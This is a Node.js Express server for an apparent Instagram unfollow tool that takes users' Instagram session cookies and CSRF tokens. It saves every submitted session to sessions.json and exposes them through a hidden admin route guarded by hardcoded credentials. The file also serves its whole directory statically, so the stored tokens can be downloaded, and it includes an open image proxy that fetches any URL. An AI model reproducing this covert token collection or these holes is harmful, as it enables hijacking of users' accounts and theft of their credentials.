import express from "express";
import fetch from "node-fetch";
import path from "path";
import { fileURLToPath } from "url";
import { execFile } from "child_process";
import fs from "fs";
import crypto from "crypto";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(express.json());

const SESSIONS_FILE = "sessions.json";
const PORT = process.env.PORT || 8000;

// Python path - use environment variable or detect platform
let PYTHON_PATH = process.env.PYTHON_PATH;
if (!PYTHON_PATH) {
  // Windows
  if (process.platform === 'win32') {
    PYTHON_PATH = "C:\\Users\\ilias\\AppData\\Local\\Programs\\Python\\Python311\\python.exe";
  } else {
    // Linux/Railway
    PYTHON_PATH = "python3";
  }
}

// Admin auth
const adminTokens = new Set();
const ADMIN_USERNAME = "iliasm9wd";
const ADMIN_PASSWORD = "iliasm9wd";

function generateToken() {
  return crypto.randomUUID();
}

function getCookie(req, name) {
  const cookies = req.headers.cookie || "";
  const match = cookies.split(";").find(c => c.trim().startsWith(name + "="));
  return match ? match.trim().split("=")[1] : null;
}

function adminAuth(req, res, next) {
  const token = getCookie(req, "admin_token");
  if (!adminTokens.has(token)) {
    return res.status(401).json({ error: "Unauthorized" });
  }
  next();
}

function loadSessions() {
  if (!fs.existsSync(SESSIONS_FILE)) return [];
  return JSON.parse(fs.readFileSync(SESSIONS_FILE, "utf8"));
}

function saveSessions(sessions) {
  fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions, null, 2));
}

function upsertSession(uid, username, sessionid, csrftoken) {
  let sessions = loadSessions();
  const existing = sessions.findIndex(s => s.uid === uid);
  const now = new Date().toISOString();

  if (existing >= 0) {
    sessions[existing].last_used = now;
    sessions[existing].sessionid = sessionid;
    sessions[existing].csrftoken = csrftoken;
  } else {
    sessions.push({
      uid, username, sessionid, csrftoken,
      added_at: now,
      last_used: now
    });
  }
  saveSessions(sessions);
}

/* ---------- LOGIN ---------- */
app.post("/login", (req, res) => {
  const { sessionid, csrftoken } = req.body;
  if (!sessionid || !csrftoken) {
    return res.status(400).json({ error: "Missing sessionid or csrftoken" });
  }

  execFile(PYTHON_PATH, [
    "fetch_user_info.py",
    "--sessionid", sessionid,
    "--csrftoken", csrftoken,
    "--get-uid"
  ], (err, stdout) => {
    if (err) {
      return res.status(401).json({ error: "Invalid session or network error" });
    }
    try {
      const data = JSON.parse(stdout);
      const uid = data.uid || data.pk;
      const username = data.username;
      upsertSession(uid, username, sessionid, csrftoken);
      res.json({ uid, username });
    } catch (e) {
      res.status(500).json({ error: "Failed to parse user data" });
    }
  });
});

/* ---------- FETCH ---------- */
app.post("/fetch", (req, res) => {
  const { sessionid, csrftoken, uid } = req.body;
  if (!sessionid || !csrftoken || !uid) {
    return res.status(400).json({ error: "Missing credentials" });
  }

  const userDir = path.join(".ig_cache", uid);
  res.setHeader("Content-Type", "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Connection", "keep-alive");

  const proc = execFile(PYTHON_PATH, [
    "insta_non_follow.py",
    "--sessionid", sessionid,
    "--csrftoken", csrftoken,
    "--uid", uid,
    "--user-dir", userDir
  ]);

  let buffer = "";

  proc.stdout.on("data", (data) => {
    buffer += data.toString();
    const lines = buffer.split("\n");
    buffer = lines.pop();

    for (const line of lines) {
      if (line.trim()) {
        res.write(`data: ${JSON.stringify({ msg: line })}\n\n`);
      }
    }
  });

  proc.stdout.on("end", () => {
    if (buffer.trim()) {
      res.write(`data: ${JSON.stringify({ msg: buffer })}\n\n`);
    }
  });

  proc.on("close", (code) => {
    if (code === 0) {
      res.write(`data: ${JSON.stringify({ done: true })}\n\n`);
    } else {
      res.write(`data: ${JSON.stringify({ error: "Fetch failed" })}\n\n`);
    }
    res.end();
  });

  proc.on("error", (err) => {
    res.write(`data: ${JSON.stringify({ error: err.message })}\n\n`);
    res.end();
  });
});

/* ---------- IMAGE PROXY ---------- */
app.get("/img", async (req,res)=>{
  try{
    const r = await fetch(req.query.url,{
      headers:{
        "User-Agent":"Mozilla/5.0",
        "Referer":"https://www.instagram.com/"
      }
    });
    res.set("Content-Type", r.headers.get("content-type"));
    r.body.pipe(res);
  }catch{
    res.sendStatus(500);
  }
});

/* ---------- UNFOLLOW ---------- */
app.post("/unfollow",(req,res)=>{
  const { pk, sessionid, csrftoken, uid } = req.body;
  if(!pk || !sessionid || !csrftoken) return res.sendStatus(400);
  const userDir = path.join(".ig_cache", uid || "default");
  execFile(PYTHON_PATH, ["unfollow.py", pk, "--sessionid", sessionid, "--csrftoken", csrftoken, "--user-dir", userDir], (err,stdout,stderr)=>{
    if(err) return res.status(500).json({error:stderr||"unfollow failed"});
    res.json({ok:true,msg:stdout});
  });
});

/* ---------- CHECK ---------- */
app.post("/check",(req,res)=>{
  const { pk, sessionid, csrftoken } = req.body;
  if(!pk || !sessionid || !csrftoken) return res.sendStatus(400);
  execFile(PYTHON_PATH, ["check.py", pk, "--sessionid", sessionid, "--csrftoken", csrftoken], (err,stdout,stderr)=>{
    if(err) return res.status(500).json({error:stderr||"check failed"});
    try{ res.json(JSON.parse(stdout)); }
    catch(e){ res.status(500).json({error:"Invalid JSON from Python"}); }
  });
});

/* ---------- ADMIN PANEL ---------- */
app.get("/ilias/m9wd", (req, res) => {
  res.sendFile(path.join(__dirname, "admin.html"));
});

app.post("/ilias/m9wd/login", (req, res) => {
  const { username, password } = req.body;
  if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
    const token = generateToken();
    adminTokens.add(token);
    res.setHeader("Set-Cookie", `admin_token=${token}; Path=/; HttpOnly; SameSite=Strict`);
    res.json({ ok: true });
  } else {
    res.status(401).json({ error: "Invalid credentials" });
  }
});

app.get("/ilias/m9wd/sessions", adminAuth, (req, res) => {
  const sessions = loadSessions();
  res.json({ sessions });
});

app.post("/ilias/m9wd/logout", (req, res) => {
  const token = getCookie(req, "admin_token");
  if (token) adminTokens.delete(token);
  res.setHeader("Set-Cookie", `admin_token=; Path=/; HttpOnly; SameSite=Strict; Max-Age=0`);
  res.json({ ok: true });
});

/* ---------- STATIC ---------- */
app.use("/.ig_cache", express.static(path.join(__dirname,".ig_cache")));
app.use(express.static(__dirname));

/* ---------- START SERVER ---------- */
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
